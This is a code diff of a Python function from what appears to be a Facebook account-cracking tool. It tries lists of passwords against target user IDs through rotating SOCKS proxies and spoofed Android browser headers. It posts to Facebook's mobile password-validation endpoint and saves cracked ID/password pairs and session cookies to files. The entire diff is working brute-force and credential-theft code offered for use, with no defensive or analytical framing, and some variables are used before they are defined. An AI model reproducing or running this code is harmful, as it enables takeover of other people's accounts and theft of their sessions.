@@ -671,85 +671,88 @@ def crack(idf,pwv):
 ###method##
 def crackfree(idf,pwv):
     global loop,ok,cp
-    sys.stdout.write(f"\r{H}\x1b[33m[RUSSI\x1b[32m\x1b[33m]{P} \x1b[33m[{H}{loop}{P}\x1b[33m]{P} \x1b[33m[{H}{len(id)}{P}\x1b[33m] \x1b[33m[\x1b[32mOK/\x1b[36mCP\x1b[33m] \x1b[33m[\x1b[32m{ok}/\x1b[36m{cp}\x1b[33m] \x1b[33m[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}\x1b[33m]  "),
-    sys.stdout.flush()
-    ua = random.choice(ugen)
-    ua2 = random.choice(ugen2)
-    ses = requests.Session()
-    for pw in pwv:
-        try:
-            nip=random.choice(prox)
-            proxs= {'http': 'socks4://'+nip}
-            ses.headers.update = {'Host': 'm.facebook.com',
-    'authority': 'm.facebook.com',
+	bi = random.choice(['\33[m'])
+	pers = loop*200/len(id2)
+	fff = '%'
+	sys.stdout.write(f"\r \x1b[1;97m[  \x1b[1;97mRaWa-MobiLe🌪️  \x1b[1;97m{loop}\x1b[1;97m＋\x1b[1;97m{len(id)}  \x1b[1;97mOK:{ok}  \x1b[1;97mCP:{cp}  ]"),
+	ua = random.choice(ugen)
+	random.choice(ugen)
+	ua = random.choice(ugenxe)
+	random.choice(ugenxe)
+	ua = random.choice(ugen2)
+	random.choice(ugen2)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			nip=random.choice(prox)
+			proxs= {'http': 'socks5://'+nip}
+			ses.headers.update = {'Host': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9,ckb-IQ;q=0.8,ckb;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    'dpr': '3',
-    'referer': 'https://m.facebook.com/login/?wtsid=rdr_0DWXTXfgWC9oUZAWw&refsrc=deprecated&_rdr',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"',
-    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5819.205", "Google Chrome";v="116.0.5819.205"',
+    'dpr': '2.75',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"TECNO LE7"',
+    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '""',
+    'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': ua,
     'viewport-width': '980',
 }
-            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
-            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
-            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-            koki+=' m_pixel_ratio=2.625; wd=412x756'
-            heade = {'Host': 'm.facebook.com',
-    'authority': 'm.facebook.com',
+			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=1.75; wd=412x814'
+			heade = {'Host': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9,ckb-IQ;q=0.8,ckb;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    'dpr': '3',
-    'referer': 'https://m.facebook.com/login/?wtsid=rdr_0DWXTXfgWC9oUZAWw&refsrc=deprecated&_rdr',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"',
-    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5819.205", "Google Chrome";v="116.0.5819.205"',
+    'dpr': '2.75',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"TECNO LE7"',
+    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '""',
+    'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': ua,
     'viewport-width': '980',
 }
-            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
-            if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[0;31m[\33[1;31mCP\33[1;94m]  {idf}  {pw} ')
-                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
-                akun.append(idf+' • '+pw)
-                cp+=1
-                break
-            elif "c_user" in ses.cookies.get_dict().keys():
-                ok+=1
-                coki=po.cookies.get_dict()
-                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\x1b[32[RUSSI-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
-                os.system('espeak -a 300 " , cracking ok russi,  id password"')
-                open('/sdcard/RUSSI-Up-OK.txt','a').write(idf+'|'+pw+'\n')
-                open('/sdcard/ROZH-RUSSI-COOKIEI.txt','a').write(cokii+'\n')
-                break
-                
-            else:
-                continue
-        except requests.exceptions.ConnectionError:
-            time.sleep(31)
-    loop+=1
+			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				#print( f'\r\x1b[1;93m 𝑳𝑨𝑳𝑳_𝐂𝐏  ♕︎ \033[1;32m {idf} | \033[1;32m{pw} | ')
+				#os.system('espeak -a 300 " LALO,   CRACKER,    CP"')
+				open('//LALO-.txt','a').write(f'{idf}|{pw}|{ua}|{kuki}\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f'\r\x1b[1;92m RAWA_𝐎𝐊 ID | {idf} PASS | {pw} \nCOOKIE | {kuki}')
+				#os.system('espeak -a 300 " LALO,   CRACKER,    OK"')
+				open('/sdcard/KILLER-OK.txt','a').write(f'{idf}|{pw}\n')
+				cek_LALO(kuki)
+				break
+				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(1)
+	loop+=1
  #FREE METHOD #
 def crack(idf, pwv):
     global loop, ok, cp
